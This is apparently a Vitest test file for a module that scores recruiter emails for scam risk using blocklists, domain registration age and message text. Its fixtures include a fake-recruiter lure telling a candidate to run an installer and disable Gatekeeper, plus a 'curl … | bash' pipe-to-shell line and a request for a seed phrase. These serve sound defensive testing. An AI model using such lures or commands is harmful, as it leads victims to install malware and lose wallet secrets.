import { describe, expect, it, vi } from "vitest";
import {
  DEFAULT_THREAT_BLOCKLIST,
  analyzeOutreachText,
  evaluateRecruiterThreat,
  extractDomain,
  matchesBlocklist,
  queryDomainRdap,
  registeredDomain,
} from "./threat-intel.js";

const NOW = Date.parse("2026-06-01T00:00:00Z");
const daysAgo = (n: number) => new Date(NOW - n * 86_400_000).toISOString();

function rdapFetch(registeredAt: string) {
  return vi.fn(async () =>
    new Response(
      JSON.stringify({
        events: [{ eventAction: "registration", eventDate: registeredAt }],
        entities: [{ roles: ["registrar"], vcardArray: ["vcard", [["fn", {}, "text", "Example Registrar"]]] }],
      }),
      { status: 200, headers: { "content-type": "application/rdap+json" } },
    ),
  );
}

const TAKE_HOME =
  "Hi Alex, thanks for your time today. Next step is a short take-home: clone the repo and run npm install, then npm test. Send us a link to your fork when done.";

const MALICIOUS =
  "Great profile! Before our call please download the meeting client update from our site (MeetingHelper.dmg) and run it. If macOS blocks it, disable Gatekeeper for a minute.";

describe("threat-intel", () => {
  it("ships an empty built-in blocklist", () => {
    expect(DEFAULT_THREAT_BLOCKLIST).toEqual([]);
  });

  it("extracts hostnames from emails, URLs and bare domains", () => {
    expect(extractDomain("dana@mail.hr.example")).toBe("mail.hr.example");
    expect(extractDomain("https://www.example.org/jobs/1")).toBe("example.org");
    expect(extractDomain("Example.NET.")).toBe("example.net");
    expect(extractDomain("not a domain")).toBeNull();
    expect(extractDomain("localhost")).toBeNull();
  });

  it("reduces hostnames to the registered domain", () => {
    expect(registeredDomain("careers.jobs.example.com")).toBe("example.com");
    expect(registeredDomain("example.com")).toBe("example.com");
    expect(registeredDomain("hr.example.co.uk")).toBe("example.co.uk");
    expect(registeredDomain("talent.example.com.br")).toBe("example.com.br");
  });

  it("queries RDAP for the registered domain, not the full hostname", async () => {
    const fetchFn = rdapFetch("2015-01-01T00:00:00Z");
    const r = await evaluateRecruiterThreat({ domainOrEmail: "https://hr.recruit.example.co.uk/careers" }, { fetchFn, blocklist: [], now: NOW });
    expect(fetchFn).toHaveBeenCalledTimes(1);
    expect(String((fetchFn.mock.calls[0] as unknown[])[0])).toBe("https://rdap.org/domain/example.co.uk");
    expect(r.registeredDomain).toBe("example.co.uk");
    expect(r.domainInfo?.registrar).toBe("Example Registrar");
    expect(r.riskLevel).toBe("safe");
  });

  it("matches the blocklist on dot boundaries only", () => {
    expect(matchesBlocklist("blocked.example", ["blocked.example"])).toBe("blocked.example");
    expect(matchesBlocklist("mail.blocked.example", ["blocked.example"])).toBe("blocked.example");
    expect(matchesBlocklist("notblocked.example", ["blocked.example"])).toBeNull();
    expect(matchesBlocklist("blocked.example.net", ["blocked.example"])).toBeNull();
  });

  it("rates an operator-blocklisted sender critical without a network call", async () => {
    const fetchFn = vi.fn();
    const r = await evaluateRecruiterThreat({ domainOrEmail: "jordan@hr.blocked.example" }, { fetchFn, blocklist: ["blocked.example"] });
    expect(r).toMatchObject({ riskLevel: "critical", isThreat: true, score: 1 });
    expect(fetchFn).not.toHaveBeenCalled();
  });

  it("does not flag a normal take-home from an established domain", async () => {
    const r = await evaluateRecruiterThreat(
      { domainOrEmail: "recruiting@example.com", messageText: TAKE_HOME },
      { fetchFn: rdapFetch("2012-03-04T00:00:00Z"), blocklist: [], now: NOW },
    );
    expect(r.riskLevel).toBe("safe");
    expect(r.isThreat).toBe(false);
    expect(analyzeOutreachText(TAKE_HOME).flags).toEqual([]);
  });

  it("keeps a free-mail sender with a normal take-home below medium", async () => {
    const r = await evaluateRecruiterThreat({ domainOrEmail: "gmail.com", messageText: TAKE_HOME }, { fetchFn: vi.fn(), blocklist: [] });
    expect(r.riskLevel).toBe("low");
    expect(r.isThreat).toBe(false);
  });

  it("rates a fresh domain with a normal take-home high, not critical", async () => {
    const r = await evaluateRecruiterThreat(
      { domainOrEmail: "hr@example.org", messageText: TAKE_HOME },
      { fetchFn: rdapFetch(daysAgo(10)), blocklist: [], now: NOW },
    );
    expect(r.riskLevel).toBe("high");
    expect(r.domainInfo?.ageDays).toBe(10);
  });

  it("caps content-only score so text alone cannot reach high", () => {
    const c = analyzeOutreachText(`${MALICIOUS} Also curl -s https://example.net/setup.sh | bash and send your seed phrase.`);
    expect(c.flags.length).toBeGreaterThan(2);
    expect(c.score).toBe(0.4);
  });

  it("flags a clearly malicious message from a fresh domain as critical", async () => {
    const r = await evaluateRecruiterThreat(
      { domainOrEmail: "talent@example.net", messageText: MALICIOUS },
      { fetchFn: rdapFetch(daysAgo(5)), blocklist: [], now: NOW },
    );
    expect(r.riskLevel).toBe("critical");
    expect(r.isThreat).toBe(true);
    expect(r.flags).toEqual(expect.arrayContaining([expect.stringContaining("installer"), expect.stringContaining("antivirus")]));
    expect(JSON.stringify(r)).not.toContain("MeetingHelper");
  });

  it("skips the domain-age signal when RDAP fails", async () => {
    const r = await evaluateRecruiterThreat(
      { domainOrEmail: "hr@example.org" },
      { fetchFn: vi.fn(async () => { throw new Error("network down"); }), blocklist: [] },
    );
    expect(r.riskLevel).toBe("safe");
    expect(r.domainInfo?.rdapAvailable).toBe(false);
    expect(r.flags).toContain("Domain age unavailable (RDAP lookup failed)");

    await expect(queryDomainRdap("example.org", { fetchFn: vi.fn(async () => new Response("oops", { status: 503 })) })).resolves.toEqual({ domain: "example.org", rdapAvailable: false });
    await expect(queryDomainRdap("example.org", { fetchFn: vi.fn(async () => new Response("<html>", { status: 200 })) })).resolves.toEqual({ domain: "example.org", rdapAvailable: false });
  });

  it("clears the RDAP timeout after a failed lookup", async () => {
    vi.useFakeTimers();
    try {
      await queryDomainRdap("example.org", { fetchFn: vi.fn(async () => { throw new Error("boom"); }) });
      expect(vi.getTimerCount()).toBe(0);
    } finally {
      vi.useRealTimers();
    }
  });
});
